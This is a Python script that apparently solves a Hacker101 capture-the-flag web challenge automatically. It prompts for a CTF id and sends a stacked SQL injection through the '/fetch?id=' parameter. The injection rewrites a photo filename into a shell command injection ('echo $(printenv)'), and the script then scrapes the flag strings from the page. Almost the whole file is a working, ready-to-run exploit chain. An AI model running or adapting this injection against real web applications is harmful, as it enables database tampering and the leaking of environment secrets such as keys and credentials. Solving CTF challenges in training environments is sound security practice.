# Importing Packages #
from requests import get as get_request
from re import findall as find_all_flags
# Getting CTF URL #
ctf_url = f"https://{input("\033[32m[1] Enter your ctf id: \033[0m")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Printing Message before featching all flags #
        print("\033[33m[2] Please wait while we featch all flags.\033[0m")
        # Making a get request using sqlinjection to write evn in index url #
        get_request(f'{ctf_url}/fetch?id=3;%20UPDATE%20photos%20SET%20filename=";%20echo%20$(printenv)"%20WHERE%20id=3;%20commit;', headers = {"Sec-Ch-Ua-Platform": "Windows", "Accept-Language": "en-US,en;q=0.9", "Sec-Ch-Ua": '"Not A(Brand";v="8", "Chromium";v="132"', "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", "Sec-Ch-Ua-Mobile": "?0", "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Dest": "image", "Referer": ctf_url, "Accept-Encoding": "gzip, deflate, br", "Priority": "u=2"})
        # Appeding all flags found #
        FLAGS.append([f'^FLAG^{flag}$FLAG$' for flag in find_all_flags(r"\^FLAG\^(.*?)\$FLAG\$" ,get_request(ctf_url).text)])
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m[3] {str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[3] Your flags are: {FLAGS}\033[0m")